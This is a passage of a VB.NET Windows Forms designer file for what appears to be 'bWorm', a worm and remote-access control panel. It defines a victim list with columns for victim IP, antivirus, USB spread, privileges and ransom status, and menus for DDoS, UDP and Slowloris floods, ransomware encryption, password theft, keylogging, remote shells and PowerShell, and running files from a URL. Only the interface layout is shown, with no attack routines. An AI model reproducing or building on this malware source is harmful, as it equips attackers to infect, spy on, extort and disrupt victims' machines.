        Me.IMG2.Images.SetKeyName(186, "SDN.png")
        Me.IMG2.Images.SetKeyName(187, "SEN.png")
        Me.IMG2.Images.SetKeyName(188, "SGP.png")
        Me.IMG2.Images.SetKeyName(189, "SGS.png")
        Me.IMG2.Images.SetKeyName(190, "SHN.png")
        Me.IMG2.Images.SetKeyName(191, "SJM.png")
        Me.IMG2.Images.SetKeyName(192, "SLB.png")
        Me.IMG2.Images.SetKeyName(193, "SLE.png")
        Me.IMG2.Images.SetKeyName(194, "SLV.png")
        Me.IMG2.Images.SetKeyName(195, "SMR.png")
        Me.IMG2.Images.SetKeyName(196, "SOM.png")
        Me.IMG2.Images.SetKeyName(197, "SPM.png")
        Me.IMG2.Images.SetKeyName(198, "SRB.png")
        Me.IMG2.Images.SetKeyName(199, "STP.png")
        Me.IMG2.Images.SetKeyName(200, "SUR.png")
        Me.IMG2.Images.SetKeyName(201, "SVK.png")
        Me.IMG2.Images.SetKeyName(202, "SVN.png")
        Me.IMG2.Images.SetKeyName(203, "SWE.png")
        Me.IMG2.Images.SetKeyName(204, "SWZ.png")
        Me.IMG2.Images.SetKeyName(205, "SYC.png")
        Me.IMG2.Images.SetKeyName(206, "SYR.png")
        Me.IMG2.Images.SetKeyName(207, "TCA.png")
        Me.IMG2.Images.SetKeyName(208, "TCD.png")
        Me.IMG2.Images.SetKeyName(209, "TGO.png")
        Me.IMG2.Images.SetKeyName(210, "THA.png")
        Me.IMG2.Images.SetKeyName(211, "TJK.png")
        Me.IMG2.Images.SetKeyName(212, "TKL.png")
        Me.IMG2.Images.SetKeyName(213, "TKM.png")
        Me.IMG2.Images.SetKeyName(214, "TLS.png")
        Me.IMG2.Images.SetKeyName(215, "TON.png")
        Me.IMG2.Images.SetKeyName(216, "TTO.png")
        Me.IMG2.Images.SetKeyName(217, "TUN.png")
        Me.IMG2.Images.SetKeyName(218, "TUR.png")
        Me.IMG2.Images.SetKeyName(219, "TUV.png")
        Me.IMG2.Images.SetKeyName(220, "TWN.png")
        Me.IMG2.Images.SetKeyName(221, "TZA.png")
        Me.IMG2.Images.SetKeyName(222, "UGA.png")
        Me.IMG2.Images.SetKeyName(223, "UKR.png")
        Me.IMG2.Images.SetKeyName(224, "UMI.png")
        Me.IMG2.Images.SetKeyName(225, "URY.png")
        Me.IMG2.Images.SetKeyName(226, "USA.png")
        Me.IMG2.Images.SetKeyName(227, "UZB.png")
        Me.IMG2.Images.SetKeyName(228, "VAT.png")
        Me.IMG2.Images.SetKeyName(229, "VCT.png")
        Me.IMG2.Images.SetKeyName(230, "VEN.png")
        Me.IMG2.Images.SetKeyName(231, "VGB.png")
        Me.IMG2.Images.SetKeyName(232, "VIR.png")
        Me.IMG2.Images.SetKeyName(233, "VNM.png")
        Me.IMG2.Images.SetKeyName(234, "VUT.png")
        Me.IMG2.Images.SetKeyName(235, "WLF.png")
        Me.IMG2.Images.SetKeyName(236, "WSM.png")
        Me.IMG2.Images.SetKeyName(237, "X.png")
        Me.IMG2.Images.SetKeyName(238, "YEM.png")
        Me.IMG2.Images.SetKeyName(239, "ZAF.png")
        Me.IMG2.Images.SetKeyName(240, "ZMB.png")
        Me.IMG2.Images.SetKeyName(241, "ZWE.png")
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage1)
        Me.TabControl1.Controls.Add(Me.TabPage2)
        Me.TabControl1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControl1.Location = New System.Drawing.Point(0, 24)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(798, 379)
        Me.TabControl1.TabIndex = 6
        '
        'TabPage1
        '
        Me.TabPage1.Controls.Add(Me.Panel3)
        Me.TabPage1.Controls.Add(Me.Panel2)
        Me.TabPage1.Controls.Add(Me.Panel1)
        Me.TabPage1.Location = New System.Drawing.Point(4, 22)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(790, 353)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "[ Clients ]"
        Me.TabPage1.UseVisualStyleBackColor = True
        '
        'Panel3
        '
        Me.Panel3.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Panel3.Controls.Add(Me.Lv1)
        Me.Panel3.Location = New System.Drawing.Point(598, 161)
        Me.Panel3.Name = "Panel3"
        Me.Panel3.Size = New System.Drawing.Size(191, 191)
        Me.Panel3.TabIndex = 9
        '
        'ContextMenuStrip4
        '
        Me.ContextMenuStrip4.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CopyDataToolStripMenuItem})
        Me.ContextMenuStrip4.Name = "ContextMenuStrip4"
        Me.ContextMenuStrip4.Size = New System.Drawing.Size(130, 26)
        '
        'CopyDataToolStripMenuItem
        '
        Me.CopyDataToolStripMenuItem.Image = CType(resources.GetObject("CopyDataToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CopyDataToolStripMenuItem.Name = "CopyDataToolStripMenuItem"
        Me.CopyDataToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.CopyDataToolStripMenuItem.Text = "Copy Data"
        '
        'ImageList1
        '
        Me.ImageList1.ImageStream = CType(resources.GetObject("ImageList1.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList1.Images.SetKeyName(0, "transmit.png")
        Me.ImageList1.Images.SetKeyName(1, "user_gray.png")
        Me.ImageList1.Images.SetKeyName(2, "world.png")
        Me.ImageList1.Images.SetKeyName(3, "tux.png")
        Me.ImageList1.Images.SetKeyName(4, "bug_delete.png")
        Me.ImageList1.Images.SetKeyName(5, "shield.png")
        Me.ImageList1.Images.SetKeyName(6, "brick.png")
        Me.ImageList1.Images.SetKeyName(7, "layout.png")
        Me.ImageList1.Images.SetKeyName(8, "drive.png")
        '
        'Panel2
        '
        Me.Panel2.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Panel2.Controls.Add(Me.PictureBox1)
        Me.Panel2.Location = New System.Drawing.Point(598, 2)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Size = New System.Drawing.Size(189, 157)
        Me.Panel2.TabIndex = 8
        '
        'PictureBox1
        '
        Me.PictureBox1.BackColor = System.Drawing.Color.Black
        Me.PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.PictureBox1.Location = New System.Drawing.Point(0, 0)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(189, 157)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 0
        Me.PictureBox1.TabStop = False
        '
        'Panel1
        '
        Me.Panel1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Panel1.Controls.Add(Me.L1)
        Me.Panel1.Location = New System.Drawing.Point(2, 2)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(593, 350)
        Me.Panel1.TabIndex = 7
        '
        'TabPage2
        '
        Me.TabPage2.Controls.Add(Me.Logs)
        Me.TabPage2.Location = New System.Drawing.Point(4, 22)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(790, 353)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "[ Logs ]"
        Me.TabPage2.UseVisualStyleBackColor = True
        '
        'ContextMenuStrip3
        '
        Me.ContextMenuStrip3.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ClearLogsToolStripMenuItem})
        Me.ContextMenuStrip3.Name = "ContextMenuStrip3"
        Me.ContextMenuStrip3.Size = New System.Drawing.Size(130, 26)
        '
        'ClearLogsToolStripMenuItem
        '
        Me.ClearLogsToolStripMenuItem.Image = CType(resources.GetObject("ClearLogsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ClearLogsToolStripMenuItem.Name = "ClearLogsToolStripMenuItem"
        Me.ClearLogsToolStripMenuItem.Size = New System.Drawing.Size(129, 22)
        Me.ClearLogsToolStripMenuItem.Text = "Clear Logs"
        '
        'Lv1
        '
        Me.Lv1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.Lv1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader5})
        Me.Lv1.ContextMenuStrip = Me.ContextMenuStrip4
        Me.Lv1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Lv1.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.Lv1.FullRowSelect = True
        Me.Lv1.GridLines = True
        Me.Lv1.Items.AddRange(New System.Windows.Forms.ListViewItem() {ListViewItem1, ListViewItem2, ListViewItem3, ListViewItem4, ListViewItem5, ListViewItem6, ListViewItem7, ListViewItem8, ListViewItem9})
        Me.Lv1.LargeImageList = Me.ImageList1
        Me.Lv1.Location = New System.Drawing.Point(0, 0)
        Me.Lv1.Name = "Lv1"
        Me.Lv1.Size = New System.Drawing.Size(191, 191)
        Me.Lv1.SmallImageList = Me.ImageList1
        Me.Lv1.TabIndex = 8
        Me.Lv1.UseCompatibleStateImageBehavior = False
        Me.Lv1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader5
        '
        Me.ColumnHeader5.Text = "[ General Information ]"
        Me.ColumnHeader5.Width = 188
        '
        'L1
        '
        Me.L1.BackColor = System.Drawing.Color.White
        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.hname, Me.hip, Me.hmtx, Me.hpc, Me.huser, Me.hco, Me.hos, Me.hcpu, Me.hav, Me.hfw, Me.hvr, Me.hping, Me.hac, Me.hinstall, Me.hcheck, Me.hadmin, Me.hransom})
        Me.L1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.L1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.L1.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.L1.ForeColor = System.Drawing.Color.Black
        Me.L1.FullRowSelect = True
        Me.L1.GridLines = True
        Me.L1.LargeImageList = Me.IMG2
        Me.L1.Location = New System.Drawing.Point(0, 0)
        Me.L1.Name = "L1"
        Me.L1.Size = New System.Drawing.Size(593, 350)
        Me.L1.SmallImageList = Me.IMG2
        Me.L1.TabIndex = 4
        Me.L1.UseCompatibleStateImageBehavior = False
        Me.L1.View = System.Windows.Forms.View.Details
        '
        'hname
        '
        Me.hname.Text = " ][ Victim ID ]["
        Me.hname.Width = 108
        '
        'hip
        '
        Me.hip.Text = "][ Victim IP ]["
        Me.hip.Width = 105
        '
        'hmtx
        '
        Me.hmtx.Text = "][ MUTEX ]["
        Me.hmtx.Width = 94
        '
        'hpc
        '
        Me.hpc.Text = "][ PC ]["
        Me.hpc.Width = 100
        '
        'huser
        '
        Me.huser.Text = "][ USER ]["
        Me.huser.Width = 118
        '
        'hco
        '
        Me.hco.Text = "][ Country ]["
        Me.hco.Width = 107
        '
        'hos
        '
        Me.hos.Text = "][ Operating System ]["
        Me.hos.Width = 140
        '
        'hcpu
        '
        Me.hcpu.Text = "][ CPU ]["
        Me.hcpu.Width = 87
        '
        'hav
        '
        Me.hav.Text = "][ AntiVirus ]["
        Me.hav.Width = 101
        '
        'hfw
        '
        Me.hfw.Text = "][ FireWall ]["
        Me.hfw.Width = 106
        '
        'hvr
        '
        Me.hvr.Text = "][ WorM Version ]["
        Me.hvr.Width = 131
        '
        'hping
        '
        Me.hping.Text = "][ PING ]["
        '
        'hac
        '
        Me.hac.Text = "][ Active Window ]["
        Me.hac.Width = 164
        '
        'hinstall
        '
        Me.hinstall.Text = "][ Install Date ]["
        Me.hinstall.Width = 97
        '
        'hcheck
        '
        Me.hcheck.Text = "][ USB Spread ]["
        Me.hcheck.Width = 156
        '
        'hadmin
        '
        Me.hadmin.Text = "][ Client Privileges ]["
        Me.hadmin.Width = 146
        '
        'hransom
        '
        Me.hransom.Text = "][ Ransom Status ]["
        Me.hransom.Width = 146
        '
        'Logs
        '
        Me.Logs.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader4, Me.ColumnHeader2, Me.ColumnHeader3})
        Me.Logs.ContextMenuStrip = Me.ContextMenuStrip3
        Me.Logs.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Logs.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.Logs.FullRowSelect = True
        Me.Logs.GridLines = True
        Me.Logs.Location = New System.Drawing.Point(3, 3)
        Me.Logs.Name = "Logs"
        Me.Logs.Size = New System.Drawing.Size(784, 347)
        Me.Logs.TabIndex = 0
        Me.Logs.UseCompatibleStateImageBehavior = False
        Me.Logs.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "[ Time ]"
        Me.ColumnHeader1.Width = 150
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "[ Client IP ]"
        Me.ColumnHeader4.Width = 101
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "[ Message ]"
        Me.ColumnHeader2.Width = 380
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "[ Status ]"
        Me.ColumnHeader3.Width = 144
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(798, 425)
        Me.Controls.Add(Me.TabControl1)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Controls.Add(Me.MenuStrip1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Window Name"
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.MenuStrip1.ResumeLayout(False)
        Me.MenuStrip1.PerformLayout()
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.Panel3.ResumeLayout(False)
        Me.ContextMenuStrip4.ResumeLayout(False)
        Me.Panel2.ResumeLayout(False)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Panel1.ResumeLayout(False)
        Me.TabPage2.ResumeLayout(False)
        Me.ContextMenuStrip3.ResumeLayout(False)
        Me.ResumeLayout(False)
        Me.PerformLayout

End Sub
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip

    Friend WithEvents ToolStripStatusLabel1 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel2 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ContextMenuStrip2 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RunFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromDiskToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DDosAttacKToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ServerSettingToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SEOToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem

    Friend WithEvents OpenWebPageToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator1 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ChangeColorToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents USBVictimToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents Timer2 As System.Windows.Forms.Timer
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents VvvToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromDiskToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents OpenWebSiteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DDOSAttackToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents WormSettingToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents BlockWebSiteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ComputerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents LogoffToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem3 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ShutdownToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MenuStrip1 As System.Windows.Forms.MenuStrip
    Friend WithEvents StartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripStatusLabel7 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel8 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents PluginManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ExecuteScriptToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RansomwareToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents EncryptToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DecryptToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UDPAttackToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SlowlorisAttackToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PluginsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GetPasswordToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CoustomPluginToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ElevetePrivlageToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StartToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StopToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TransferToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripStatusLabel3 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel4 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel5 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel6 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripDropDownButton1 As System.Windows.Forms.ToolStripDropDownButton
    Friend WithEvents ColorsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ListViewToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents LargeIconsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SmallIconsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ListToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TitleToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents BackColorToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FontColorToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GrindLineToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ShowToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents HideToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SendPugToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents NoIPToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DNSDynmicToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents IMG2 As System.Windows.Forms.ImageList
    Friend WithEvents TabControl1 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents Logs As bWorm.LV
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents InfectToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ContextMenuStrip3 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ClearLogsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SurveillanceToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FileManagerToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteDesktopToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ProcessManagerToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents KeyloggerToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CommandShellToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents IPLocationToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripStatusLabel10 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel9 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents GroupsSettingsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AddToGroupToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoveFromGroupToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MultiToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents L1 As bWorm.LV
    Friend WithEvents hname As System.Windows.Forms.ColumnHeader
    Friend WithEvents hip As System.Windows.Forms.ColumnHeader
    Friend WithEvents hpc As System.Windows.Forms.ColumnHeader
    Friend WithEvents huser As System.Windows.Forms.ColumnHeader
    Friend WithEvents hco As System.Windows.Forms.ColumnHeader
    Friend WithEvents hos As System.Windows.Forms.ColumnHeader
    Friend WithEvents hcpu As System.Windows.Forms.ColumnHeader
    Friend WithEvents hav As System.Windows.Forms.ColumnHeader
    Friend WithEvents hfw As System.Windows.Forms.ColumnHeader
    Friend WithEvents hvr As System.Windows.Forms.ColumnHeader
    Friend WithEvents hping As System.Windows.Forms.ColumnHeader
    Friend WithEvents hac As System.Windows.Forms.ColumnHeader
    Friend WithEvents hinstall As System.Windows.Forms.ColumnHeader
    Friend WithEvents hcheck As System.Windows.Forms.ColumnHeader
    Friend WithEvents hadmin As System.Windows.Forms.ColumnHeader
    Friend WithEvents Panel3 As System.Windows.Forms.Panel
    Friend WithEvents Panel2 As System.Windows.Forms.Panel
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents ImageList1 As System.Windows.Forms.ImageList
    Friend WithEvents Lv1 As bWorm.LV
    Friend WithEvents ColumnHeader5 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ContextMenuStrip4 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents CopyDataToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ServiceManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents hmtx As System.Windows.Forms.ColumnHeader
    Friend WithEvents StartupManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SingleTransferToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MultiTransferToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StartToolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StopToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemotePowershellToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents hransom As System.Windows.Forms.ColumnHeader

End Class
